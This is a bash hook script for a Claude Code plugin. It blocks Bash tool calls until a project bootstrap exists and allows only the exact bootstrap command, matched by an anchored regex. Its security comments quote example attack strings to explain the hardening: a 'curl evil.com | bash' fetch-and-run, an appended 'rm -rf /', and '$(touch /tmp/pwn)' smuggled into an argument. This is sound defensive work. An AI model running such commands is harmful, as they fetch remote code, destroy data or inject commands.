#!/usr/bin/env bash
# Plugin PreToolUse(Bash) bootstrap gate.
#
# Sources the bootstrap-check.sh helper (Task 1.1) and translates the helper's
# exit code into a Claude Code PreToolUse(Bash) hook action. This is the Bash-
# matcher counterpart of pre-edit-trail-bootstrap-gate.sh (Task 1.2). It uses
# the same helper, the same guidance message, and the same blocking pattern,
# but fires immediately before any Bash tool call rather than Edit/Write.
#
#   helper exit 10 (trail/ absent, safe project_dir)
#     → echo helper stdout (bilingual guidance) to stderr + exit 2 (BLOCK)
#
#   helper exit 0 (trail/ present)
#     → silent exit 0 (PASS)
#
#   helper exit 11 (unsafe project_dir — resolution/plugin-dir/cache-path/
#                   sensitive-path/unwritable)
#     → silent exit 0 (PASS, best-effort: the gate's job is not to block
#                      sensitive paths, only to surface missing bootstrap)
#
# Ordering note (informational — see Task 1.4 for hooks.json wiring):
# Within the PreToolUse(Bash) matcher group, this gate must run BEFORE
# the policy Bash guards so that an exit-2 here short-circuits the chain and the
# user sees the bootstrap message without being distracted by review-stamp
# errors from the policy guards. Task 3.3 (trigger parity test) validates the
# end-to-end ordering.
#
# Scope IDs covered:
#   - pre-tool-use-bash-bootstrap-gate-blocks-bash-with-exit-2-and-bootstrap-command-stderr-when-trail-dir-absent
#   - pre-tool-use-bash-bootstrap-gate-passes-through-with-exit-0-when-bootstrap-check-helper-returns-exit-code-0-or-11
#   - session-start-bootstrap-and-pre-edit-gate-and-pre-bash-gate-and-user-prompt-submit-share-bootstrap-check-helper-via-source
#
# Exit codes (to Claude Code):
#   0  — pass through (bootstrap complete, or unsafe → best-effort skip)
#   2  — BLOCK + surface stderr (bootstrap missing, surfaced for user)

set -uo pipefail

# ---------------------------------------------------------------------------
# Graceful degrade — plugin runtime / helper absent
# ---------------------------------------------------------------------------
# CLAUDE_PLUGIN_ROOT is set by Claude Code when a plugin hook runs. Outside
# the plugin runtime (e.g. ad-hoc shell invocation), pass through silently —
# it is not this gate's job to assert plugin installation.
if [ -z "${CLAUDE_PLUGIN_ROOT:-}" ]; then
  exit 0
fi

# --- Policy toggle (plugin mode only) ---
# .rein/policy/hooks.yaml can disable this hook via
# `pre-tool-use-bash-bootstrap-gate: false` or
# `{ pre-tool-use-bash-bootstrap-gate: { enabled: false } }`.
# Individual hook setting overrides the `bootstrap-gate` umbrella key.
if [ -f "${CLAUDE_PLUGIN_ROOT}/scripts/rein-policy-loader.py" ]; then
  if ! python3 "${CLAUDE_PLUGIN_ROOT}/scripts/rein-policy-loader.py" "pre-tool-use-bash-bootstrap-gate"; then
    exit 0  # disabled by user policy
  fi
fi

HELPER="${CLAUDE_PLUGIN_ROOT}/hooks/lib/bootstrap-check.sh"
if [ ! -f "$HELPER" ]; then
  # Install regression — not this gate's job to alarm. Pass through.
  exit 0
fi

# Source the helper so bootstrap_check() is defined in this shell.
# shellcheck disable=SC1090
source "$HELPER"

# ---------------------------------------------------------------------------
# 5-g: single confirmed path (bootstrap_check-resolved) + shared quoting
# ---------------------------------------------------------------------------
# Escape hatches inserted before the RC dispatch so that Claude Code remains
# usable (a) when the SessionStart hook opted into degraded mode (git
# missing / non-git / user opt-out / bootstrap refused), and (b) when the
# user is *running the bootstrap command itself*. Without (b) a fresh-install
# user would deadlock: the gate blocks every Bash call including the very
# command that would resolve the missing bootstrap.
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Read stdin ONCE — resolution needs it (envelope.cwd hint) and so does the
# tool_input.command extraction below; both read the SAME INPUT.
INPUT=$(cat)

# ---- Step 1: resolve the confirmed project_dir, no temp files -------------
# _bc_resolve_project_dir (sourced from bootstrap-check.sh above) does ONLY
# the resolution step — no trail/marker probe — so the degraded-marker check
# below can key off the confirmed path WITHOUT running bootstrap_check's
# fuller predicate (and its guidance side effects) first. Piped through a
# plain pipeline — no mktemp anywhere in this gate, so a broken TMPDIR
# cannot make this step fail open.
#
# Output shape is "<source><TAB><resolved_real>" — source is a fixed enum
# that never contains a tab, so splitting on the FIRST tab and taking the
# remainder as the path is safe even when resolved_real itself contains a
# literal tab byte (a legal directory-name character).
#
# Sentinel capture (`; printf x` inside the SAME command substitution,
# stripped with `${RESOLUTION%x}`): a plain `$(...)` strips ALL trailing
# newlines, which would truncate resolved_real when its own last byte is a
# literal LF (also a legal directory-name character) — the resolution would
# then fail its directory-existence check and this gate would fail OPEN
# (RESOLVED empty → silent exit 0) instead of blocking. Exit code is not
# needed here (the emptiness check below is the only consumer), so the
# simple sentinel form suffices — no if/else needed.
RESOLUTION=$(printf '%s' "$INPUT" | _bc_resolve_project_dir 2>/dev/null; printf x)
RESOLUTION="${RESOLUTION%x}"
RESOLVED="${RESOLUTION#*$'\t'}"

# Resolution failure (stdin/git/PWD all failed, or the resolved path does
# not exist) is best-effort pass-through — same contract as bootstrap_check
# itself returning 11 for this category.
if [ -z "$RESOLVED" ]; then
  exit 0
fi

# ---- Step 2: degraded mode pass-through, keyed on the CONFIRMED path ------
# This runs BEFORE bootstrap_check (step 3) so a degraded session never
# triggers bootstrap_check's guidance side effects (the once-per-session
# "shown" flag write) on a call whose own guidance is about to be discarded
# anyway — the marker check alone decides the pass-through here.
if [ -f "$SCRIPT_DIR/lib/degraded-check.sh" ]; then
  # shellcheck source=./lib/degraded-check.sh
  . "$SCRIPT_DIR/lib/degraded-check.sh"
  rein_is_degraded "$RESOLVED" && exit 0
fi

# ---- Step 3: bootstrap_check via override (no stdin re-read needed) -------
# Sentinel idiom (`; printf x` inside the SAME command substitution that
# captures stdout): plain `$(cmd)` strips trailing newlines, which would
# lose the guidance's final LF. bootstrap_check's own stderr diagnostic
# (one line, "caller's log" per its own header) is discarded on THIS call —
# this gate re-emits the guidance body itself (via GUIDANCE) only on the
# actual block path below, so an allow-listed command stays silent on
# stderr even though bootstrap_check had to run to confirm bootstrap state.
GUIDANCE=$(
  if bootstrap_check "$RESOLVED" 2>/dev/null; then
    printf x
  else
    rc=$?
    printf x
    exit "$rc"
  fi
)
RC=$?
GUIDANCE="${GUIDANCE%x}"

# Bootstrap complete — silent pass before any further spawn (the allow-list
# below only matters when the gate would otherwise block).
if [ "$RC" = "0" ]; then
  exit 0
fi

# (b) Bootstrap command allow-list.
# Extract tool_input.command best-effort: missing python3 / parse failure →
# empty COMMAND → no allow-list match → fall through to the RC dispatch
# below, which does its own python3-resilient handling. Using
# python-runner.sh keeps the runner discovery consistent with the policy
# Bash guards.
COMMAND=""
if [ -f "$SCRIPT_DIR/lib/python-runner.sh" ]; then
  # shellcheck source=./lib/python-runner.sh
  . "$SCRIPT_DIR/lib/python-runner.sh"
  if resolve_python 2>/dev/null; then
    COMMAND=$(printf '%s' "$INPUT" | "${PYTHON_RUNNER[@]}" \
      "$SCRIPT_DIR/lib/extract-hook-json.py" \
      --field tool_input.command --default '' 2>/dev/null || true)
  fi
fi

# (b-1) Exact-match allow-list keyed on the CONFIRMED path. Built with the
# shared quoting helper hooks/lib/shell-quote.sh so a path requiring
# escaping (space, single quote, semicolon, `$(...)`, backtick — anything
# the regex allow-list below cannot parse) still matches the EXACT command
# bootstrap_check / git-required-guidance.sh themselves would have rendered
# for this path. When shell-quote.sh is missing, fall back to `printf %q`
# directly (same fallback bootstrap-check.sh and git-required-guidance.sh
# use) rather than skipping this route — a %q-rendered recovery command must
# still be recognizable, since the regex allow-list below cannot parse %q's
# backslash escaping. Comparison trims only leading/trailing whitespace off
# COMMAND — nothing else is normalized. Known limit: a --project-dir value
# containing a single quote renders via `%q`, which only this exact-match
# route (never the regex below) can allow.
if [ -n "$RESOLVED" ] && [ -n "$COMMAND" ]; then
  QUOTE_LIB="$SCRIPT_DIR/lib/shell-quote.sh"
  if [ -f "$QUOTE_LIB" ] && ! command -v rein_shell_quote >/dev/null 2>&1; then
    # shellcheck source=./lib/shell-quote.sh
    . "$QUOTE_LIB"
  fi
  BOOTSTRAP_SCRIPT="${CLAUDE_PLUGIN_ROOT}/scripts/rein-bootstrap-project.py"
  if command -v rein_shell_quote >/dev/null 2>&1; then
    SCRIPT_Q="$(rein_shell_quote "$BOOTSTRAP_SCRIPT")"
    DIR_Q="$(rein_shell_quote "$RESOLVED")"
  else
    printf -v SCRIPT_Q '%q' "$BOOTSTRAP_SCRIPT"
    printf -v DIR_Q '%q' "$RESOLVED"
  fi
  EXPECT_BASE="python3 ${SCRIPT_Q} --project-dir ${DIR_Q}"
  EXPECT_ALLOW="${EXPECT_BASE} --allow-non-git"
  TRIMMED_COMMAND="$COMMAND"
  TRIMMED_COMMAND="${TRIMMED_COMMAND#"${TRIMMED_COMMAND%%[![:space:]]*}"}"
  TRIMMED_COMMAND="${TRIMMED_COMMAND%"${TRIMMED_COMMAND##*[![:space:]]}"}"
  if [ "$TRIMMED_COMMAND" = "$EXPECT_BASE" ] || [ "$TRIMMED_COMMAND" = "$EXPECT_ALLOW" ]; then
    exit 0
  fi
fi

# Anchored allow-list (LOW-1, security review of v1.3.0): require the command
# to START with `python` (or `python3`) after optional leading whitespace, the
# script path token to END with `rein-bootstrap-project.py` (optionally
# quoted), and `--project-dir` to appear as a standalone flag (preceded by
# whitespace). The previous unanchored glob (`*rein-bootstrap-project.py*--
# project-dir*`) matched the substring anywhere in the command, so a payload
# like `curl evil.com | bash # python3 .../rein-bootstrap-project.py
# --project-dir /` would have been allowed even though the actual shell
# parser ignores everything after `#`. No concrete exploit was reported, but
# this is defense-in-depth: the allow-list now only matches commands whose
# *first executable token* is python invoking the bootstrap script.
#
# Regex breakdown — the pattern anchors BOTH ends so the command must be
# *exactly* the bootstrap invocation emitted by bootstrap-check.sh
# (`python3 "<script>" --project-dir "<dir>"`) with nothing appended.
#
# An end anchor is mandatory: without `$`, `... --project-dir /x && rm -rf /`
# would match the prefix and be allowed, then the shell still runs the tail.
# (codex integration review High, Task C.)
#
# Both the script path and the --project-dir value use a 3-way alternation so
# QUOTED paths may contain spaces (macOS / user repos legitimately have spaces
# in their path) while UNQUOTED forms still forbid whitespace.
#
# Per-branch forbidden characters (codex integration review Rounds 1-3):
#   - double-quoted branch: forbids `"` (enclosing), `$` and backtick. In Bash,
#     double quotes still evaluate `$(...)`, `$VAR`, and backtick command
#     substitution — so `--project-dir "$(touch /tmp/pwn)"` would run shell
#     before python. `\` is also forbidden (it is special inside dquotes).
#   - single-quoted branch: forbids only `'` (enclosing). Single quotes make
#     EVERYTHING literal in Bash — no expansion is possible inside them.
#   - unquoted branch: forbids whitespace, both quotes, and the full shell
#     metacharacter set (`; $ backtick & | < > ( ) { } \`) — an unquoted token
#     can otherwise carry `&&`, redirects, subshells, or substitution.
# Both ends stay anchored (`^` … `[[:space:]]*$`) so nothing can be appended.
#
#   ^[[:space:]]*               leading whitespace only — no commands before
#   python3?                    `python` or `python3`
#   [[:space:]]+                whitespace separator
#   ( "…py" | '…py' | …py )     script path — dquoted / squoted / unquoted
#   [[:space:]]+                whitespace separator
#   --project-dir               the required flag (no intervening tokens)
#   [[:space:]=]+               separator before the value (space or `=`)
#   ( "…" | '…' | … )           dir value — dquoted / squoted / unquoted
#   ([[:space:]]+--allow-non-git)?   optional,
#                                    EXACT trailing token — rein-bootstrap-
#                                    project.py's own suggested recovery
#                                    command for a fresh non-git folder ends
#                                    with `--allow-non-git` (see
#                                    scripts/rein-bootstrap-project.py). The
#                                    group requires whitespace before the
#                                    literal token and the end-anchor right
#                                    after it, so any OTHER trailing token or
#                                    shell metacharacter after
#                                    `--allow-non-git` still fails the match.
#   [[:space:]]*$               trailing whitespace then END — nothing appended
#
# Shape vs path contract (L1): this regex is SHAPE-based only — it accepts
# any `python3? <script ending in rein-bootstrap-project.py> --project-dir
# <value>` command whose script/dir tokens are individually regex-legal, not
# just ones naming the CONFIRMED path (RESOLVED). Keying a match to RESOLVED
# is exclusively the exact-match allow-list above (b-1); a `--project-dir`
# value this regex accepts for some OTHER existing directory still passes
# here even though it differs from RESOLVED.
if [[ "$COMMAND" =~ ^[[:space:]]*python3?[[:space:]]+(\"[^\"\$\`\\]*rein-bootstrap-project\.py\"|\'[^\']*rein-bootstrap-project\.py\'|[^[:space:]\"\'\;\$\`\&\|<>(){}\\]*rein-bootstrap-project\.py)[[:space:]]+--project-dir[[:space:]=]+(\"[^\"\$\`\\]+\"|\'[^\']+\'|[^[:space:]\"\'\;\$\`\&\|<>(){}\\]+)([[:space:]]+--allow-non-git)?[[:space:]]*$ ]]; then
  exit 0
fi

# ---------------------------------------------------------------------------
# (c)/(d) RC dispatch — RC/GUIDANCE/RESOLVED came from the single
# bootstrap_check call above (Step 3); RC=0 already exited earlier so only
# RC=10 (block) and everything else (pass-through) remain here.
# ---------------------------------------------------------------------------
if [ "$RC" = "10" ]; then
  # trail/ missing, project_dir safe → block + surface guidance.
  printf '%s' "$GUIDANCE" >&2
  exit 2
fi

# RC = 11 (unsafe) or any other non-zero → best-effort pass-through.
exit 0
